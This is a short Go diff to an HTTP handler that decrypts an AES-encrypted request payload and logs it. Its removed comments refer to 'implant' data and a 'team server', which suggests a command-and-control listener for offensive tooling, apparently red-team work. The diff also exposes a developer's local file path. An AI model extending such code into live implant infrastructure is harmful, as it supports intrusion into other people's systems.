@@ -27,7 +27,7 @@ var (
 
 func ProcessRequest(c *gin.Context) {
 	var (
-		decryptedKey []byte
+		decryptedPayload []byte
 	)
 	body, err := io.ReadAll(c.Request.Body)
 	if err != nil {
@@ -42,18 +42,13 @@ func ProcessRequest(c *gin.Context) {
 		c.JSON(http.StatusInternalServerError, "Internal Server Error")
 	}
 
-	decryptedKey, err = Crypt.DecryptAESKey(data_package.EncryptedAESKey, data_package.EncryptedAESKeySize,
-		"C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\")
+	decryptedPayload, err = Crypt.AESDecryptPayload(data_package, "C:\\Users\\Brendan Ortiz\\Documents\\GOProjcets\\AllSecure\\")
 	if err != nil {
-		c.JSON(http.StatusMovedPermanently, DenyRequest)
-	}
-	log.Println(decryptedKey)
-	//TODO: retrieve the implant data from implant itself, process it & send event to team server.
-
-	err = SendEvent("NewImplant")
-	if err != nil {
+		log.Println("[error] attempting to decrypt payload")
 		c.JSON(http.StatusInternalServerError, "Internal Server Error")
 	}
+
+	log.Println(string(decryptedPayload))
 
 }
 func DenyRequest(c *gin.Context) {
